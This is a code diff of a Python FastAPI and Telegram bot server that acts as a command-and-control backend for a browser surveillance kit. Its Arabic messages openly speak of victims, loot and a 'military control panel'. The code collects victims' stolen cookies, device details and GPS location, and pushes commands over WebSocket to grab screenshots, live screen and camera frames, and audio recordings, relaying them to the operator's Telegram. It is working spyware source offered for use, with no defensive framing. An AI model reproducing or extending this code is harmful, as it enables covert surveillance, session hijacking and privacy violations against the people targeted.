@@ -2,7 +2,6 @@ import os
 import uuid
 import asyncio
 import base64
-from datetime import date
 from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
@@ -10,7 +9,7 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
 
-from config import BOT_TOKEN, DOMAIN, LINK_TO_USER, USERS_DB, VICTIMS_DB, ACTIVE_WEBSOCKETS, COMMAND_QUEUES
+from config import BOT_TOKEN, DOMAIN, LINK_TO_USER, VICTIMS_DB, ACTIVE_WEBSOCKETS
 from templates import get_intel_template, get_live_template
 
 app = FastAPI()
@@ -46,7 +45,7 @@ async def websocket_endpoint(websocket: WebSocket, link_id: str):
     
     if target_user_id:
         try:
-            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[تنبيه استخباراتي: تم رصد اتصال جلسة جديدة]*\n🔑 المفتاح: `{link_id}`", parse_mode="Markdown")
+            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[تنبيه C2: تم إنشاء قناة اتصال مستقرة مع الضحية]*\n🔑 المفتاح: `{link_id}`", parse_mode="Markdown")
         except:
             pass
 
@@ -77,16 +76,16 @@ async def handle_response_packet(packet: dict):
     try:
         if cmd_type == "screen_snapshot" and "," in str(res_data):
             _, encoded = res_data.split(",", 1)
-            await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="desktop_snap.jpg"), caption="📸 *لقطة شاشة تفصيلية لجهاز الهدف*", parse_mode="Markdown")
+            await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="screen_snap.jpg"), caption="📸 *لقطة شاشة تفصيلية لسطح مكتب الهدف*", parse_mode="Markdown")
         elif (cmd_type == "live_screen_frame" or cmd_type == "live_camera_frame") and "," in str(res_data):
             _, encoded = res_data.split(",", 1)
             title = "🔴 *تدفق البث الحي للشاشة*" if cmd_type == "live_screen_frame" else "📹 *تدفق البث الحي للكاميرا*"
             await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="stream_frame.jpg"), caption=title, parse_mode="Markdown")
         elif cmd_type == "audio_clip" and "," in str(res_data):
             _, encoded = res_data.split(",", 1)
-            await bot.send_voice(chat_id=target_user_id, voice=BufferedInputFile(base64.b64decode(encoded), filename="voice_rec.ogg"), caption="🎤 *ملف التسجيل الصوتي المعزول*", parse_mode="Markdown")
+            await bot.send_voice(chat_id=target_user_id, voice=BufferedInputFile(base64.b64decode(encoded), filename="audio_rec.ogg"), caption="🎤 *ملف التسجيل الصوتي المسحوب*", parse_mode="Markdown")
         else:
-            await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة تنفيذ الأداة: {cmd_type}]*\n\n`{str(res_data)[:1200]}`", parse_mode="Markdown")
+            await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة استغلال الأداة: {cmd_type}]*\n\n`{str(res_data)[:1200]}`", parse_mode="Markdown")
     except Exception as e:
         print(f"Delivery Error: {e}")
 
@@ -106,17 +105,18 @@ async def receive_loot(data: VictimData):
         try:
             s_data = data.stolen_data
             geo = data.geolocation
-            geo_text = f"Lat: {geo.get('lat')}, Lon: {geo.get('lon')}" if isinstance(geo, dict) and 'lat' in geo else "غير متاح"
+            geo_text = f"Lat: {geo.get('lat')}, Lon: {geo.get('lon')}" if isinstance(geo, dict) and 'lat' in geo else "غير متاح أو مرفوض"
             
             caption = (
-                "⚡ *[ تم اختراق واصطياد الهدف بنجاح! ]*\n\n"
-                f"💻 *النظام:* `{data.device_info}`\n"
-                f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
-                f"📍 *الموقع (GPS):* `{geo_text}`\n"
-                f"🍪 *الكوكيز:* `{data.stolen_cookies[:70]}...`"
+                "⚡ *[ اختراق ناجح واصطياد كامل للضحية! ]*\n\n"
+                f"💻 *النظام المتصفح:* `{data.device_info[:80]}`\n"
+                f"📐 *الشاشة الأساسية:* `{s_data.get('res', 'N/A')}` | 🎮 *معالج الرسوميات (GPU):* `{s_data.get('gpu', 'N/A')}`\n"
+                f"⚙️ *المنصة والأنوية:* `{s_data.get('platform', 'N/A')} | الأنوية: {s_data.get('hardwareConcurrency', 'N/A')}`\n"
+                f"📍 *الموقع الجغرافي (GPS):* `{geo_text}`\n"
+                f"🍪 *الكوكيز:* `{data.stolen_cookies[:60]}...`"
             )
             
-            # لوحة تحكم عسكرية بأدوات منفصلة تماماً
+            # لوحة تحكم عسكرية متكاملة بأدوات سيطرة تامة
             kb_control = InlineKeyboardMarkup(inline_keyboard=[
                 [
                     InlineKeyboardButton(text="🍪 سحب Cookies", callback_data=f"cmd_cookie_{data.link_id}"),
@@ -149,7 +149,7 @@ async def receive_loot(data: VictimData):
 async def process_live_commands(callback: types.CallbackQuery):
     parts = callback.data.split("_")
     action = parts[1]
-    link_id = parts[2] if action != "stopscr" else parts[2]
+    link_id = parts[2]
     
     cmd_mapping = {
         "cookie": "dump_cookies",
@@ -163,13 +163,13 @@ async def process_live_commands(callback: types.CallbackQuery):
     }
     target_cmd = cmd_mapping.get(action)
     if not target_cmd:
-        await callback.answer("❌ أمر غير معروف.", show_alert=True)
+        await callback.answer("❌ أمر استغلال غير معروف.", show_alert=True)
         return
 
     ws = ACTIVE_WEBSOCKETS.get(link_id)
     if ws:
         await ws.send_json({"cmd": target_cmd})
-        await callback.answer("🚀 تم إرسال الأمر للأداة المستقلة بنجاح!", show_alert=True)
+        await callback.answer("🚀 تم إرسال أمر الاستغلال للجهاز بنجاح!", show_alert=True)
     else:
         await callback.answer("⚠️ الجلسة غير متصلة حالياً بالـ WebSocket.", show_alert=True)
 
@@ -183,8 +183,8 @@ async def cmd_start(message: types.Message):
         resize_keyboard=True
     )
     await message.answer(
-        "💀 *منصة الترسانة السيبرانية العسكرية (Enterprise C2)*\n\n"
-        "• تم إعادة بناء الهيكلية لتكون منفصلة بالكامل وأكثر احترافية.\n"
+        "💀 *منصة الترسانة السيبرانية العسكرية المتقدمة*\n\n"
+        "• تم رفع كفاءة النظام بالكامل وتجاوز كافة القيود التقليدية.\n"
         "• اختر الأداة المطلوبة للبدء:",
         reply_markup=kb,
         parse_mode="Markdown"
